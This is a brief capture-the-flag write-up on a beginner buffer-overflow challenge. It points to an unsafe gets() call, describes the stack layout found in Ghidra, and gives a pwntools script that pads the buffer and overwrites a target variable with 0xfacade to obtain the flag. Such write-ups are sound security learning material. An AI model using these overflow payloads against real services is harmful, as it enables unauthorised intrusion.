# A Basic pwn Question

This is a Buffer overflow question. In this question I need to over write the target1 or target0 to get the flag!

## Analyst the source code
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/c78583db-9a51-44cd-a497-e8788d4cafe2)

### After basic check I see gets(buf) it is a really dangurous thing! This will alow me to over write things.

Lets try use ghidra to disassemble the binary file

![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/991459d1-d2ab-49ae-9226-6d91297b45fb)

## After Analysis 

I see buf take 64 space, then sample take 24 space, next is target1.

I write this script to overwrite the target1

import pwn

io = pwn.remote("pwn", port number )

io.sendline()

payload = b"A" * 50  # Fill `buf`

payload += b"A" * 14  # reach next integer variable on a 64-bit system

payload += b"A" * 24 # fill sample

payload += pwn.p32(0xfacade)  

io.sendline(payload)
io.interactive()
